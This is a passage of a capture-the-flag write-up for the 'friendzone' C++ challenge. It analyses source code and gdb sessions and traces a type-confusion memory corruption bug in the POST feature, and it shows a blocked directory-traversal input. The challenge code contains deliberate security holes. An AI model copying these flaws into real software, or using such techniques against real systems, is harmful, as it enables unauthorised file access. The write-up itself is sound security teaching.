    | |_ | '__| |/ _ \\ '_ \\ / _` | / // _ \\| '_ \\ / _ \\
    |  _|| |  | |  __/ | | | (_| |/ /| (_) | | | |  __/
    |_|  |_|  |_|\\___|_| |_|\\__,_/____\\___/|_| |_|\\___|
    --------------------------------------------------------------------------------
    Welcome to Friendzone Social Media! The leader in most advertisements.
    --------------------------------------------------------------------------------
    
	... CONTENT SNIPPED ...
```

Right now, we have a sub-objective: **import some profiles**.
The logs above are important because they give us a starting point for static analysis.

#### Static Analysis: Profile Importing

Let's search the code for all references to `Loading [SOME_CONTENT] profile data...`

```
┌──(kali㉿kali)-[~/…/tenable-2021/writeups/friendzone/source]
└─$ grep -in loading *                                                                                                                                                                  2 ⨯
grep: build: Is a directory
Database.cpp:21:                                cout << "Loading " + string(profile_directory + string(pDirent->d_name)) + " profile data..." << endl;
```

Excellent! Looks like we have a hit on line 21 in `Database.cpp` which maps to the `Database::LoadAccounts()` C++ method!

##### Database::LoadAccounts() implementation in Database.cpp

```cpp
void Database::LoadAccounts() {
	char buffer[0x1000] = { 0 };
	struct dirent* pDirent;
	
	DIR* epdf = opendir(profile_directory.c_str());
	if (epdf != NULL) {
		while (pDirent = readdir(epdf)) {
			if (pDirent->d_type != DT_DIR) {
				FILE* fp = fopen(string(profile_directory + string(pDirent->d_name)).c_str(), "r");
				cout << "Loading " + string(profile_directory + string(pDirent->d_name)) + " profile data..." << endl;
				
				fread(buffer, 0x1000, 1, fp);
				LoadProfile(string(buffer));
				memset(buffer, 0, 0x1000);
				usleep(500000);
			}
		}
	}
}
```

The code above enumerates all files in the configured `profile_directory` and processes the data from each file in the `Database::LoadProfile()` method.
Note that `profile_directory` is a member variable that is initialized to `profiles/` as seen in the implementation of the `Database` class constructor.

##### Database constructor implementation in Database.cpp

```cpp
Database::Database() : profile_directory("profiles/") {
	LoadAccounts();
}
```

So with this information, let's create a `profiles` directory within the same current working directory `friendzone` is running in:

```
┌──(kali㉿kali)-[~/…/writeups/friendzone/source/build]
└─$ mkdir profiles

┌──(kali㉿kali)-[~/…/writeups/friendzone/source/build]
└─$ ls
CMakeCache.txt  CMakeFiles  cmake_install.cmake  friendzone  Makefile  profiles
```

Ok, now let's look at the format in which the accounts need to be serialized in.
From analyzing `Database::LoadAccounts()`, we can see that a `buffer` variable is passed to the `Database::LoadProfile()` method.

#### Database::LoadAccounts() implementation in Database.cpp

```cpp
void Database::LoadProfile(string profiledata) {
	vector<string> profile_items = ParseProfile(profiledata);
	string ad_type, name, address, status, gender;
	char last_post[0x1000];
	Business* bs;
	User* u;
	Advertisement* ad;
	unsigned int profile_type, profile_id, age;
	try {
		profile_type = stoi(profile_items.at(0));
		name = profile_items.at(1);
		profile_id = stoi(profile_items.at(2));
	}
	catch (const std::out_of_range& oor) {
		cout << "Error parsing profile data" << endl;
		return;
	}

	switch (profile_type) {
	case ProfileType::PERSON:
		try {
			address = profile_items.at(3);
			age = stoi(profile_items.at(4));
			gender = profile_items.at(5);
			status = profile_items.at(6);
			memcpy(last_post, profile_items.at(7).c_str(), 0x1000);
			ad_type = profile_items.at(8);
		}
		catch (const std::out_of_range& oor) {
			cout << "Error parsing profile data" << endl;
			return;
		}
		u = new User(name, address, age, gender, status, ad_type);
		u->profile_id = profile_id;
		memcpy(u->last_post, last_post, 0x1000);
		AddAccount(u);
		break;
	case ProfileType::BUSINESS:
		try {
			address = profile_items.at(3);
			status = profile_items.at(4);
			memcpy(last_post, profile_items.at(5).c_str(), 0x1000);
			ad_type = profile_items.at(6);
		}
		catch (const std::out_of_range& oor) {
			cout << "Error parsing profile data" << endl;
			return;
		}
		
		bs = new Business(name, address, status, ad_type);
		bs->profile_id = profile_id;
		memcpy(bs->last_post, last_post, 0x1000);
		AddAccount(bs);
		break;
	case ProfileType::ADVERTISEMENT:
		ad = new Advertisement(name);
		ad->profile_id = profile_id;
		AddAccount(ad);
		break;
	}

}
```

Skimming over the source code above, we can see that different kinds of profiles are imported based on the `profile_type` attribute.
The `profile_type` attribute is read from the `profile_items` which are initialized via the `Database::ParseProfile()` method in the first line of `Database::LoadAccounts()`.

Let's see how `Database::ParseProfile()` is implemented to reverse-engineer the format of a serialized profile.


#### Database::ParseProfile() implementation in Database.cpp

```cpp
vector<string> Database::ParseProfile(string profiledata) {
	vector<string> tokens;
	size_t pos = profiledata.find("|");
	size_t last_pos = 0;
	while (pos != std::string::npos) {
		tokens.push_back(profiledata.substr(last_pos, pos));
		last_pos = pos+last_pos+1;
		pos = profiledata.substr(last_pos, profiledata.length()).find("|");
	}
	tokens.push_back(profiledata.substr(last_pos, profiledata.length() - last_pos));

	return tokens;
}
```

The method above is straight forward. It reads a `string` representing the profile data and returns a `vector<string>` where each item in the vector is delimeted by a '|' character.
Let's take a second look at `Database::LoadAccounts()`. We will notice that different kinds of accounts require a different number of tokens in `profile_items`.
For example, a `ProfileType::PERSON` profile requires 9 tokens, whereas a `ProfileType::BUSINESS` profile requires 7 tokens, and a `ProfileType::ADVERTISEMENT` profile only requires 3 tokens.
The code in `Database::LoadAccounts()` also describes the type of data that should be in each token. Note that `ProfileType` is a C++ enum in `Account.h` ranging from 0-2.

#### ProfileType declaration in Account.h

```cpp
// Used to identify object types.
enum ProfileType {
	PERSON,
	BUSINESS,
	ADVERTISEMENT
};
```

Now that we have finished analyzing the app's import feature, let's go import some profiles! All profiles will be under the `PROJECT_ROOT/source/build/profiles` directory.

#### friendzone_ceo

```
0|Alec Trevelyan|006|???|32|M|!INTERNAL FRIENDZONE EMPLOYES ONLY!|flag{w3_n33d_m0re_d@ta_2_s311}|food
```

#### katie_humphries

```
0|Katie Humphries|3000|Pwntown Route 53|33|F|Just chillin!|Test Post|food
```

#### BiscuitsCoffee

```
1|Biscuits & Coffee|4000|Coffee Town, 1337 road|Open 24/7 ready to serve ya some good c0f33!|Come get your daily dose of Java Monster!|food
```

#### food_ads

```
2|food|1001|
```

Now, let's run the `friendzone` application from its current working directory!

```
┌──(kali㉿kali)-[~/…/writeups/friendzone/source/build]
└─$ ./friendzone
Loading profiles/katie_humphries profile data...
Loading profiles/BiscuitsCoffee profile data...
Loading profiles/friendzone_ceo profile data...
Loading profiles/food_ads profile data...
terminate called after throwing an instance of 'std::invalid_argument'
  what():  Invalid Ad_type
zsh: abort      ./friendzone
```

It crashed! We need to get the app to properly load data before proceeding. Let's investigate what went wrong by debugging the app!


```
┌──(kali㉿kali)-[~/…/writeups/friendzone/source/build]
└─$ gdb -q friendzone
GEF for linux ready, type `gef' to start, `gef config' to configure
77 commands loaded for GDB 10.1.90.20210103-git using Python engine 3.9
[*] 3 commands could not be loaded, run `gef missing` to know why.
Reading symbols from friendzone...
gef➤  run
Starting program: /home/kali/ctf/tenable-2021/writeups/friendzone/source/build/friendzone
Loading profiles/katie_humphries profile data...
Loading profiles/BiscuitsCoffee profile data...
Loading profiles/friendzone_ceo profile data...
Loading profiles/food_ads profile data...
terminate called after throwing an instance of 'std::invalid_argument'
  what():  Invalid Ad_type

Program received signal SIGABRT, Aborted.
__GI_raise (sig=sig@entry=0x6) at ../sysdeps/unix/sysv/linux/raise.c:50
50      ../sysdeps/unix/sysv/linux/raise.c: No such file or directory.
... CONTENT SNIPPED ...
gef➤  bt
#0  __GI_raise (sig=sig@entry=0x6) at ../sysdeps/unix/sysv/linux/raise.c:50
#1  0x00007ffff7c25537 in __GI_abort () at abort.c:79
#2  0x00007ffff7e797ec in ?? () from /lib/x86_64-linux-gnu/libstdc++.so.6
#3  0x00007ffff7e84966 in ?? () from /lib/x86_64-linux-gnu/libstdc++.so.6
#4  0x00007ffff7e849d1 in std::terminate() () from /lib/x86_64-linux-gnu/libstdc++.so.6
#5  0x00007ffff7e84c65 in __cxa_throw () from /lib/x86_64-linux-gnu/libstdc++.so.6
#6  0x0000555555565f8b in Advertisement::Advertisement (this=0x55555559bb90, ad_type="food") at /home/kali/ctf/tenable-2021/writeups/friendzone/source/Advertisement.cpp:8
#7  0x000055555556d431 in Database::LoadProfile (this=0x55555558aef0, profiledata="2|food|1001|\n") at /home/kali/ctf/tenable-2021/writeups/friendzone/source/Database.cpp:100
#8  0x000055555556cb1c in Database::LoadAccounts (this=0x55555558aef0) at /home/kali/ctf/tenable-2021/writeups/friendzone/source/Database.cpp:24
#9  0x000055555556c851 in Database::Database (this=0x55555558aef0) at /home/kali/ctf/tenable-2021/writeups/friendzone/source/Database.cpp:9
#10 0x0000555555570690 in Console::Console (this=0x55555558aeb0) at /home/kali/ctf/tenable-2021/writeups/friendzone/source/Console.h:41
#11 0x00005555555705d2 in main () at /home/kali/ctf/tenable-2021/writeups/friendzone/source/Friendzone.cpp:4
```

From the stack trace, it is evident that the app crashed on line 8 in `Advertisement.cpp`. 

#### Method wrapping line 8 in Advertisement.cpp

```cpp
Advertisement::Advertisement(string ad_type) : Account(ProfileType::ADVERTISEMENT) {
	ad_type.erase(std::remove(ad_type.begin(), ad_type.end(), '\n'), ad_type.end());
	if (!IsAdTypeValid(ad_type))
		throw std::invalid_argument("Invalid Ad_type");
	this->ad_type = ad_type;
}
```

The `Advertisement::IsAdTypeValid()` check failed, resulting in the app throwing an uncatched exception! Let's analyze `Advertisement::IsAdTypeValid()`.


#### Advertisement::IsAdTypeValid() in Advertisement.cpp

```cpp
bool Advertisement::IsAdTypeValid(string ad_type) {
	// prevent directory traversal
	if (ad_type.find(".") != std::string::npos || ad_type.find("\\") != std::string::npos || ad_type.find("/") != std::string::npos)
		return false;
	
	//check ad_type file exists in advertisers_directory
	FILE* fp = fopen(string(advertisers_directory + ad_type).c_str(), "r");

	if (fp != NULL)
		return true;
	return false;
}
```

Since `Advertisement::IsAdTypeValid()` returned false, we will only check conditional branches that return false.
For starters, the exception was thrown when loading an advertisement and we know that our advertisement profile had no directory traversal characters in it, meaning the only way `Advertisement::IsAdTypeValid()` could have returned `false` was by attempting to open a non-existent file from the directory specified at `advertisers_directory`.

Let's see what `advertisers_directory` is initialized as by searching for references to it in the source code:

```
┌──(kali㉿kali)-[~/…/tenable-2021/writeups/friendzone/source]
└─$ grep advertisers_directory *                                                                                                                                                                       148 ⨯ 1 ⚙
Advertisement.cpp:      //check ad_type file exists in advertisers_directory
Advertisement.cpp:      FILE* fp = fopen(string(advertisers_directory + ad_type).c_str(), "r");
Advertisement.cpp:      FILE* fp = fopen(string(advertisers_directory + this->ad_type).c_str(), "r");
Advertisement.h:    char advertisers_directory[0x100] = "advertisements/";
grep: build: Is a directory
```

Looks like it is initialized as `advertisements/` in `Advertisement.h`.
Now, what kind of content should go in such a file? How would that data be serialized?

Let's see what an object of type Advertisement is capable of doing.

#### Advertisement.h

```cpp
#pragma once
#include "Account.h"
#include <stdexcept>
#include <cstring>
using namespace std;

class Advertisement : public Account {
	
public:
	char ad_text[0xf00];
    char advertisers_directory[0x100] = "advertisements/";
	string ad_type;
	Advertisement(string ad_type);
	bool ChangeAdType(string ad_type);
	bool IsAdTypeValid(string ad_type);
	string GetAdType();
	string GetAdText();
};
```

We can see that an `Advertisement` inherits all attributes from an `Account` object. Additionally, it has the ability to access its ad type with `GetAdType()`, access its ad text with `GetAdText()`, validate its ad type with `IsAdTypeValid()`, and change its ad type with `ChangeAdType()`.

With this knowledge, we can deduce that `GetAdText()` should tell us the format of the contents of the files that should go under the `advertisements/` directory.

#### Advertisement::GetAdText() in Advertisement.cpp

```cpp
string Advertisement::GetAdText() {
	//Read advertisement from file
	memset(this->ad_text, 0, 0xf00);
	
	FILE* fp = fopen(string(advertisers_directory + this->ad_type).c_str(), "r");
	if (fp == NULL) {
		return "404 - NO_AD_FOUND! This is a bug, please report to FriendZone support.";
	}
	fread(ad_text, 0xf00, 1, fp);
	return string(ad_text);
}
```

The code above simply reads `0xf00` printable bytes from the file and returns its contents. Therefore, it simply reads a text file.

Let's populate the `advertisements/` directory such that we have a file that suits the `food` advertisement associated with our `food_profile`.

```
┌──(kali㉿kali)-[~/…/writeups/friendzone/source/build]
└─$ cat profiles/food_ads
2|food|1001|

┌──(kali㉿kali)-[~/…/writeups/friendzone/source/build]
└─$ mkdir advertisements

┌──(kali㉿kali)-[~/…/writeups/friendzone/source/build]
└─$ echo -n "Tasty food for everyone\!" > advertisements/food                                                                                                                                              130 ⨯
```

Great, now let's see if the app still thows the same `Invalid Ad_type` exception:

```
┌──(kali㉿kali)-[~/…/writeups/friendzone/source/build]
└─$ ./friendzone
Loading profiles/katie_humphries profile data...
Loading profiles/BiscuitsCoffee profile data...
Loading profiles/friendzone_ceo profile data...
Loading profiles/food_ads profile data...
 _____     _                _ _____
|  ___| __(_) ___ _ __   __| |__  /___  _ __   ___
| |_ | '__| |/ _ \ '_ \ / _` | / // _ \| '_ \ / _ \
|  _|| |  | |  __/ | | | (_| |/ /| (_) | | | |  __/
|_|  |_|  |_|\___|_| |_|\__,_/____\___/|_| |_|\___|
--------------------------------------------------------------------------------
Welcome to Friendzone Social Media! The leader in most advertisements.
--------------------------------------------------------------------------------

---------------------------------------------------------
Portal Options

-CREATE_PROFILE <personal|business>
-LIST_USERS
-VIEW_PROFILE <profile_id>
-POST <profile_id>>
-EDIT_PROFILE <profile_id>

---------------------------------------------------------


cmd>
```

The data loaded without any problems! Now that we have finally loaded some testing data, we can proceed to the dynamic analysis and threat modelling stages in this application!

### Dynamic Analysis - Threat Modelling

From running the application earlier, we notice it allowed us to:

* Create profiles
* List profiles
* View/Read profiles
* Post comments to a profile
* Edit/Write profiles

Let's play around with the application a bit to further understand it while not losing sight of our primary objective: **read a VIP profile**.
Understanding how the app works will make it easier for us to reason and navigate the code during static analysis. It will also help us figure out where we want to look for vulnerabilities as we will identify risky behavior associated with the application.
We will start out by listing the profiles:

#### Analyzing the LIST_USERS and VIEW_PROFILE Features

```
cmd>LIST_USERS

Profile Ids
-------------

6
1001
3000
4000
```

Let's now read each profile starting with the `friendzone_ceo` profile represented by profile ID 6:
```
cmd>VIEW_PROFILE 6

Profile_ids under 100 are marked as private profiles!
```

Unsurprisingly, that is where the flag is since its profile ID is under 100. This is a security feature because it denied us access to the reading the profile since the profile ID was < 100. Let's keep this in the back of our heads as we will use it as our starting point for vulnerability hunting.

Let's view the advertisement profile (profile ID 1001):

```
cmd>VIEW_PROFILE 1001

Unable to view account because account is Advertiser - no profile data to see!
```

There is no profile data associated with advertisement profiles. This makes sense since only the profile type, ID, and advertisement type could be specified in an advertisement profile.

Let's take a look a the user profile (profile ID 3000):

```
cmd>VIEW_PROFILE 3000
Navigating to Katie Humphries... but first an ad!

*******************************************************************************************************

* Tasty food for everyone!

*******************************************************************************************************



User Name: Katie Humphries
Gender: F
Age: 33
Location: Pwntown Route 53

Status:  "Just chillin!"
_______________________________________________________________________________

Latest Comment: "Test Post"

_______________________________________________________________________________
```

Here, we see that all the information we provided aligns with our expectations. The user name, gender, age, address, status, and latest post all match up.
Additionally, this user profile was also associated with the food advertisement. 

Finally, let's check the business profile:

```
cmd>VIEW_PROFILE 4000
Navigating to Biscuits & Coffee... but first an ad!

*******************************************************************************************************

* Tasty food for everyone!

*******************************************************************************************************



Business Name: Biscuits & Coffee
Address: Coffee Town, 1337 road
Status: "Open 24/7 ready to serve ya some good c0f33!"
_______________________________________________________________________________

Latest Comment: "Come get your daily dose of Java Monster!"

_______________________________________________________________________________
```

This business profile behaves almost the same way as a user profile but lacks gender and age.

Perhaps if we edit profile ID 6, and change its profile ID to a value > 100 we could get the flag. Let's try the `EDIT_PROFILE` feature:

#### Analyzing the EDIT_PROFILE Feature

```
cmd>EDIT_PROFILE 6

Profile_ids under 100 are marked as private profiles!
```

I suppose that would make this challenge too easy...
Ok, let's edit the rest of the profiles:

```
cmd>EDIT_PROFILE 1001
What new ad type should this be?

ad_type>cars

Invalid! Ad_type does not exist

What new ad type should this be?

ad_type>food
---------------------------------------------------------
```

From the output above, it appears as though we can select an arbitrary file name under the `advertisements/` directory. Let's see if we can set this value to the CEO's profile where the flag is:

```
cmd>EDIT_PROFILE 1001
What new ad type should this be?

ad_type>../profiles/friendzone_ceo

Invalid! Ad_type does not exist

What new ad type should this be?

ad_type>food
```

As expected, this does not work due to the directory traversal protection in `Advertisement::IsAdTypeValid()`. You can debug and trace this for more details if you are interested.

Moving forward, let's go edit the user profile:

```
cmd>EDIT_PROFILE 3000
What would you like to change for Katie Humphries?

*User Name
*Status

cmd>none

Invalid! No such option

What would you like to change for Katie Humphries?

*User Name
*Status

cmd>User Name
What new user name would you like?

user name>Foo User
---------------------------------------------------------
Portal Options

-CREATE_PROFILE <personal|business>
-LIST_USERS
-VIEW_PROFILE <profile_id>
-POST <profile_id>>
-EDIT_PROFILE <profile_id>

---------------------------------------------------------


cmd>EDIT_PROFILE 3000
What would you like to change for Foo User?

*User Name
*Status

cmd>Status
Enter a new status

status>New status
---------------------------------------------------------
Portal Options

-CREATE_PROFILE <personal|business>
-LIST_USERS
-VIEW_PROFILE <profile_id>
-POST <profile_id>>
-EDIT_PROFILE <profile_id>

---------------------------------------------------------


cmd>VIEW_PROFILE 3000
Navigating to Foo User... but first an ad!

*******************************************************************************************************

* Tasty food for everyone!

*******************************************************************************************************



User Name: Foo User
Gender: F
Age: 33
Location: Pwntown Route 53

Status:  "New status"
_______________________________________________________________________________

Latest Comment: "Test Post"

_______________________________________________________________________________

```

Updating a user profile only allowed us to change the user's name and status. This is weird since we are not allowed to change other metadata such as the advertisement, gender, or age!

Let's see how the app behaves when we edit a business profile:

```
cmd>EDIT_PROFILE 4000
What would you like to change for Biscuits & Coffee?

*User Name
*Status

cmd>User Name
What new user name would you like?

user name>Doughnuts & Coffee
---------------------------------------------------------
Portal Options

-CREATE_PROFILE <personal|business>
-LIST_USERS
-VIEW_PROFILE <profile_id>
-POST <profile_id>>
-EDIT_PROFILE <profile_id>

---------------------------------------------------------


cmd>EDIT_PROFILE 4000
What would you like to change for Doughnuts & Coffee?

*User Name
*Status

cmd>Status
Enter a new status

status>best doughnuts in town!
---------------------------------------------------------
Portal Options

-CREATE_PROFILE <personal|business>
-LIST_USERS
-VIEW_PROFILE <profile_id>
-POST <profile_id>>
-EDIT_PROFILE <profile_id>

---------------------------------------------------------


cmd>VIEW_PROFILE 4000
Navigating to Doughnuts & Coffee... but first an ad!

*******************************************************************************************************

* Tasty food for everyone!

*******************************************************************************************************



Business Name: Doughnuts & Coffee
Address: Coffee Town, 1337 road
Status: "best doughnuts in town!"
_______________________________________________________________________________

Latest Comment: "Come get your daily dose of Java Monster!"

_______________________________________________________________________________
```

Editing a business profile was identical to editing a user profile. This makes sense why we were not given an option to modify gender or age since it appears as though the developer used a "catch all" case for editing generic profile types.

Now that we are aware of the `EDIT_PROFILE` capabilities and access controls, let's move on to analyzing the `CREATE_PROFILE` feature.

#### Analyzing CREATE_PROFILE

```
cmd>CREATE_PROFILE personal
User Name>r0kit

*********Welcome r0kit! Let's get your general location**********

Enter your city, state>pwntown
Enter your Gender>M
Enter your Age>90001
And finally, what kind of ads would you like to be shown to visitors that visit your profile?

food

Enter an AdType>food
Welcome to FriendZone r0kit! (profile_id:1133993341)
---------------------------------------------------------
Portal Options

-CREATE_PROFILE <personal|business>
-LIST_USERS
-VIEW_PROFILE <profile_id>
-POST <profile_id>>
-EDIT_PROFILE <profile_id>

---------------------------------------------------------


cmd>VIEW_PROFILE 1133993341
Navigating to r0kit... but first an ad!

*******************************************************************************************************

* Tasty food for everyone!

*******************************************************************************************************



User Name: r0kit
Gender: M
Age: 90001
Location: pwntown

Status:  ""
_______________________________________________________________________________

Latest Comment: ""

_______________________________________________________________________________
```

The key thing we learned here was that we can list the advertisements by creating a profile and associating the profile with a chosen advertisement.

#### Analyzing POST

Let's try posting comments now!

```
cmd>POST 6

Profile_ids under 100 are marked as private profiles!
```

No posting to private profiles I guess!

```
cmd>POST 1001
What would you like to post to  wall?

post>Best advertisement ever
---------------------------------------------------------
```

After posting the update to the advertisement, let's see how reading the post looks like.

```
cmd>VIEW_PROFILE 1133993341
Navigating to r0kit... but first an ad!

*******************************************************************************************************

* 404 - NO_AD_FOUND! This is a bug, please report to FriendZone support.

*******************************************************************************************************



User Name: r0kit
Gender: M
Age: 90001
Location: pwntown

Status:  ""
_______________________________________________________________________________

Latest Comment: ""

_______________________________________________________________________________
```

A mysterious 404 error! Last time we created profile `1133993341`, it was associated with an advertisement. Where did that advertisement data go?
This odd and inconsistent behavior is an interesting detail to investigate, especially since we know that reading advertisements is correlated to reading files directly from the operating system!


#### Interesting Observations

Let's take a step back and take some threat modelling notes. So far we have observed the following:

* The application has no authentication mechanisms
* The application has an access control mechanism preventing profiles with IDs < 100 from being read
* The application reads content directly from the operating system's file system when rendering advertisements
* Advertisement data is stored in the `advertisements/` directory and profile data is stored in the `profiles/` directory
* The application has directory traversal countermeasures when changing the advertisement type
* The application has integer overflow and underflow countermeasures when selecting a profile ID
* Posting a comment to an advertisement profile results in corrupting the advertisement, leaving it with a `404 NO_AD_FOUND` error
* Creating a new profile allows us to list profile names in the `profiles/` directory
* Each profile name is the name of a file on the operating system
* Each advertisement type is the name of a file on the operating system

Let's keep focusing on our main objective: read the `friendzone_ceo`'s profile. With the constraints and behavior above, if we keep investigating deeper, we might be able to read the contents from an arbitrary file on the operating system since there are so many readonly file-related operations.

### Fuzzing

After understanding how the application works, I normally take it a step further and fuzz each field for the following vulnerability categories through user input:

* Buffer overflows
* String format vulenrabilities
* Directory traversal
* Integer underflows and overflows

However, for those who have been paying close attention, we have alredy achieved a buffer overflow, so no more fuzzing should be necessary for now!

### Questionning the Bug

After posting to a comment to an advertisement, it corrupts it because profiles associated with that advertisement can no longer read from the file holding the advertisement's contents!
Let's set a breakpoint on the `Advertisement::GetAdText()` method to see what the old advertisement instance looks like after we post to it. Note that the application will render the contents of the Advertisemnt only when we view a profile.

```
┌──(kali㉿kali)-[~/…/writeups/friendzone/source/build]
└─$ gdb friendzone                                                                                                                                                                                         130 ⨯
... CONTENT SNIPPED ...
[*] 3 commands could not be loaded, run `gef missing` to know why.
Reading symbols from friendzone...
gef➤  b Advertisement::GetAdText()
Breakpoint 1 at 0x121d3: file /home/kali/ctf/tenable-2021/writeups/friendzone/source/Advertisement.cpp, line 38.
gef➤  run
Starting program: /home/kali/ctf/tenable-2021/writeups/friendzone/source/build/friendzone
Loading profiles/katie_humphries profile data...
Loading profiles/BiscuitsCoffee profile data...
Loading profiles/friendzone_ceo profile data...
Loading profiles/food_ads profile data...
 _____     _                _ _____
|  ___| __(_) ___ _ __   __| |__  /___  _ __   ___
| |_ | '__| |/ _ \ '_ \ / _` | / // _ \| '_ \ / _ \
|  _|| |  | |  __/ | | | (_| |/ /| (_) | | | |  __/
|_|  |_|  |_|\___|_| |_|\__,_/____\___/|_| |_|\___|
--------------------------------------------------------------------------------
Welcome to Friendzone Social Media! The leader in most advertisements.
--------------------------------------------------------------------------------

---------------------------------------------------------
Portal Options

-CREATE_PROFILE <personal|business>
-LIST_USERS
-VIEW_PROFILE <profile_id>
-POST <profile_id>>
-EDIT_PROFILE <profile_id>

---------------------------------------------------------


cmd>POST 1001
What would you like to post to  wall?

post>AAAAAAAA
---------------------------------------------------------
Portal Options

-CREATE_PROFILE <personal|business>
-LIST_USERS
-VIEW_PROFILE <profile_id>
-POST <profile_id>>
-EDIT_PROFILE <profile_id>

---------------------------------------------------------


cmd>VIEW_PROFILE 3000
Navigating to Katie Humphries... but first an ad!

*******************************************************************************************************


Breakpoint 1, Advertisement::GetAdText[abi:cxx11]() (this=0x55555559bb90) at /home/kali/ctf/tenable-2021/writeups/friendzone/source/Advertisement.cpp:38
38              memset(this->ad_text, 0, 0xf00);
... CONTENT SNIPPED ...
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:/home/kali/ctf/[...].cpp+38 ────
     33         return false;
     34  }
     35
     36  string Advertisement::GetAdText() {
     37         //Read advertisement from file
          // this=0x00007fffffffdab0  →  [...]  →  0x0000000000000000
 →   38         memset(this->ad_text, 0, 0xf00);
     39
     40         FILE* fp = fopen(string(advertisers_directory + this->ad_type).c_str(), "r");
     41         if (fp == NULL) {
     42                 return "404 - NO_AD_FOUND! This is a bug, please report to FriendZone support.";
     43         }
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "friendzone", stopped 0x5555555661d3 in Advertisement::GetAdText[abi:cxx11]() (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555661d3 → Advertisement::GetAdText[abi:cxx11]()(this=0x55555559bb90)
[#1] 0x555555566e0c → Console::ShowAd(this=0x55555558aeb0, ad_type="food")
[#2] 0x555555567124 → Console::HandleViewProfile(this=0x55555558aeb0)
[#3] 0x55555556abb9 → Console::HandleRoot(this=0x55555558aeb0)
[#4] 0x5555555668b7 → Console::Open(this=0x55555558aeb0)
[#5] 0x5555555705e2 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p this
$1 = (Advertisement * const) 0x55555559bb90
gef➤  p this->
ChangeAdType           GetAdType              GetProfileType         account_creation_date  ad_text                advertisers_directory  profile_id             profile_type           ~Account
GetAdText              GetProfileId           IsAdTypeValid          account_name           ad_type                posts                  profile_pic            users_directory
gef➤  p this->advertisers_directory
$2 = '\000' <repeats 255 times>
gef➤  p this->ad_text
$3 = "AAAAAAAA", '\000' <repeats 3831 times>
```

It looks like the content we posted to the advertisement somehow managed to write to the advertisement instance's `ad_text` and `advertisers_directory` member variables!
Let's take a closer look at the `Advertisement::GetAdText()` method again.

##### Advertisement::GetAdText() in Advertisement.cpp

```cpp
string Advertisement::GetAdText() {
	//Read advertisement from file
	memset(this->ad_text, 0, 0xf00);
	
	FILE* fp = fopen(string(advertisers_directory + this->ad_type).c_str(), "r");
	if (fp == NULL) {
		return "404 - NO_AD_FOUND! This is a bug, please report to FriendZone support.";
	}
	fread(ad_text, 0xf00, 1, fp);
	return string(ad_text);
}
```

Since the advertisement instance's `advertisers_directory` was non-existent, the file pointer was `NULL`. This explains the memory corruption!

To investigate this further, let's do some static analysis to find the functionality associated with posting comments to profiles:

```
┌──(kali㉿kali)-[~/…/tenable-2021/writeups/friendzone/source]
└─$ grep -n POST *                                                                                                                                                                                           2 ⨯
grep: build: Is a directory
Console.cpp:7:string COMMANDS::POST = "POST";
Console.cpp:438:        cout << "-" + root_cmds.POST + " <profile_id>>" << endl;
Console.cpp:443:// Handle POST <profile_id> cmd
Console.cpp:504:        else if (rootcmd == root_cmds.POST)
Console.h:17:   static string POST;
```

Let's check out the function in `Console.cpp` on line 504:

#### Console::HandleRoot() in Console.cpp

```cpp
// Default menu
void Console::HandleRoot(){
	string rootcmd;
   
	DisplayRootOptions();
	// Read cmd
	getline(cin, cmd);
	try{
		rootcmd = TokenizeCommand().at(0); // Get root command
	}	
	catch(const std::out_of_range& oor) {
		Error("Invalid root command!");
		return;
	}
	// Execute Cmd
	if (rootcmd == root_cmds.CREATE_PROFILE)
		HandleCreate();
	else if (rootcmd == root_cmds.VIEW_PROFILE)
		HandleViewProfile();
	else if (rootcmd == root_cmds.LIST_USERS)
		HandleListUsers();
	else if (rootcmd == root_cmds.POST)
		HandlePost();
	else if (rootcmd == root_cmds.EDIT_PROFILE)
		HandleEditProfile();
}
```

Let's navigate to `Console::HandlePost()`:

#### Console::HandlePost() in Console.cpp

```cpp
// Handle POST <profile_id> cmd
void Console::HandlePost() {
	string secondcmd, post_msg;
	Account* act;
	int profile_id;
	bool valid_response_flag = false;
	try {
		secondcmd = TokenizeCommand().at(1); // Get secondary command
	}
	catch (const std::out_of_range& oor) {
		Error("Invalid profile_id!");
		return;
	}
	act = LookupProfileId(secondcmd);
	if (act == NULL)
		return;
	try {
		profile_id = stoi(secondcmd);
	}
	catch (const std::out_of_range& oor) {
		Error("Invalid! profile_id too big");
		return;
	}

	// Read user post message
	do {
		cout << "What would you like to post to " + db->GetProfileData(profile_id)->account_name + " wall?" << endl << endl<<"post>";
		getline(cin, post_msg);
		if (post_msg.length() < 0x1000) {
			valid_response_flag = true;
			memset(((AdEnabledAccount*)db->GetProfileData(profile_id))->last_post, 0, 0x1000);
			memcpy(((AdEnabledAccount*)db->GetProfileData(profile_id))->last_post, post_msg.c_str(), post_msg.length());
		}
		else {
			Error("Invalid! too long post.");
		}
	} while (!valid_response_flag);

}
```

The code above accepts user input and looks up the profile from the second token. Integer overflows are protected with the try catch statement checking for an `std::out_of_range` and we cannot input negative values due to the `Console::is_digits()` validation that occurs in the `Console::LookupProfileId()` function.

```cpp
bool is_digits(const std::string& str)
{
	return str.find_first_not_of("0123456789") == std::string::npos;
}
```

Next, we can only post `0x1000` bytes of data to a profile. Line 473 in Console.cpp fetches the last post for the profile with the associated id, downcasts it to an `AdEnabledAccount` type, and zeroes out 0x1000 bytes of memory starting from the `last_post` offset in *what should be* an `AdEnabledAccount` structure.

After reviewing the inheritance structure associated with each possible profile, we notice the following:

```
User           --- is a ---> AdEnabledAccount --- is a ---> Account
Business       --- is a ---> AdEnabledAccount --- is a ---> Account
Advertisement                                 --- is a ---> Account
```

Since we posted to an `Advertisement` structure, the application tries to downcast the advertisement from an `Account` structure down to an `AdEnabledAccount`.
Since an `Advertisement` is not an `AdEnabledAccount`, the application then writes its post data to the offset represented by the `AdEnabledAccount::last_post` attribute which happens to be the zeroeth offset in that structure.


#### AdEnabledAccount.h

```cpp
#pragma once
#include <string>
#include <vector>
#include "Advertisement.h"
using namespace std;

class AdEnabledAccount : public Account {
public:
	char last_post[0x1000];
	string status;
	string ad_type;
	vector<string> posts;
	AdEnabledAccount(ProfileType profile_type, string ad_type);
	void AddPost(string post);
};
```

